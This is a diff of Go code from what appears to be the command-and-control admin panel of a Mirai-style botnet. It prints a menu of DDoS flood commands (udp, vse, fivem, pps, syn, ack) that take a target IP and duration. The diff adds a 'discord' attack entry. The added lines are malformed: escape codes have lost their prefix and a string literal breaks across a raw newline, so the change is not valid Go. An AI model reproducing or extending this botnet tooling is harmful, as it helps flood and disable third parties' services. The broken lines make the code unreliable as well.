@@ -126,7 +126,9 @@ func (this *Admin) Handle() {
 			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mudp <ip> <time> [len=1472] [dport=80]\x1b[1;34m                                       \x1b[1;34m║\r\n"))
 			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mvse <ip> <time> [dport=27015]\x1b[1;34m                                              \x1b[1;34m║\r\n"))
 			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mfivem <ip> <time> [dport=30120]\x1b[1;34m                                              \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mpps <ip> <time> [dport=80]\x1b[1;34m                                                  \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mdiscord <ip> <time>[1;34m                                       [1;34m║
+"))
+			this.conn.Write([]byte("[1;34m║   [1;93mpps <ip> <time> [dport=80]\x1b[1;34m                                                  \x1b[1;34m║\r\n"))
 			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mLAYER 4 TCP:                                                                        \x1b[1;34m║\r\n"))
 			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93msyn <ip> <time> [dport=80]\x1b[1;34m                                                  \x1b[1;34m║\r\n"))
 			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mack <ip> <time> [dport=80]\x1b[1;34m                                                  \x1b[1;34m║\r\n"))
